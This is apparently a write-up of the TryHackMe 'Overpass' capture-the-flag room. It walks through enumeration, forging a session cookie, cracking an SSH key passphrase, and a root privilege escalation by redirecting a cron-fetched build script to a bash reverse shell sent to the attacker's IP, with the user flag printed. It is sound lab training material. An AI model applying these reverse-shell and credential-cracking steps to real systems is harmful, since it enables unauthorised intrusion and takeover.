# TryHackMe Overpass Writeup

## Nmap scan 

```bash
nmap -sCV 10.10.197.109
```

```sql
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-21 19:56 EDT
Nmap scan report for 10.10.197.109
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.78 seconds

```

---

```
http://10.10.197.109/
```

![image](https://github.com/user-attachments/assets/b95c3937-51a7-4f15-9c6d-840e60751811)

## gobuster

```
gobuster dir -u http://10.10.197.109/ -w /home/kali/Downloads/wordlists/directory-list-2.3-medium.txt
```

![image](https://github.com/user-attachments/assets/4c4a4d71-b7d0-4a0d-aff3-801fc2334eb1)

```
http://10.10.183.88/admin/
```

![image](https://github.com/user-attachments/assets/57ef18bf-9899-48ef-af59-682301516079)

i try SQLI or bruteforce it not work i looked to ``login.js`` file:

![image](https://github.com/user-attachments/assets/176b846e-003b-42fa-9080-e17d1ac0aea8)

found :

```javascript
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

Vuln:

```js
Cookies.set("SessionToken",statusOrCookie)
```

so if i write any thing in ``SessionToken`` it will accept it 

so i will create new cookie : 

![image](https://github.com/user-attachments/assets/4354e8f3-e37c-412f-8e15-fa4002a0d204)

### **``SessionToken:anything``**

and refresh page:

![image](https://github.com/user-attachments/assets/ddd60049-fac0-48aa-9d93-6b67954e8dd7)

ooh found ``ssh key`` but it looks it have ``Passphrase `` 

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----
```

```bash
nano id_rsa
chmod 600 id_rsa
```

to get ``Passphrase `` :

```
ssh2john id_rsa > rsa_hash.txt
```

```
john rsa_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```
john rsa_hash.txt --show
```

![image](https://github.com/user-attachments/assets/5fb62244-188c-45c9-915c-c0cc8652f930)

```
james13
```

## login with ssh

```
ssh -i id_rsa james@10.10.183.88
```

![image](https://github.com/user-attachments/assets/922f5baa-91a0-4406-9737-93a18e4c5294)

user.txt

```
thm{65c1aaf000506e56996822c6281e6bf7}
```

## privilage esc

if we check ``/etc/crontab``

```
cat /etc/crontab
```

![image](https://github.com/user-attachments/assets/01fc02c1-39e0-487d-a1d0-f1d47da72392)

![image](https://github.com/user-attachments/assets/d4e17e52-48cd-4518-bf14-57babc2d3993)

```bash
cat /etc/hosts
ls -l /etc/hosts
```

![image](https://github.com/user-attachments/assets/1fee3b5e-055d-4144-ad5f-af3e81c518da)

now change the ``ip`` for ``overpass.thm`` to your ip :

![image](https://github.com/user-attachments/assets/2b7bb82f-400f-4a0c-aa65-206e33df80dd)

```bash
mkdir -p downloads/src/  
```

```bash
nano buildscript.sh
```

```
bash -c "bash -i >& /dev/tcp/10.8.47.102/4444 0>&1"
```

```
nc -lvpn 4444
```

```
python3 -m http.server 80
```

![image](https://github.com/user-attachments/assets/94c5a907-0516-406f-86c6-f2ca3a50b283)

---

![image](https://github.com/user-attachments/assets/d527d3b0-5dfc-48a6-aac1-938e7f8b74c5)

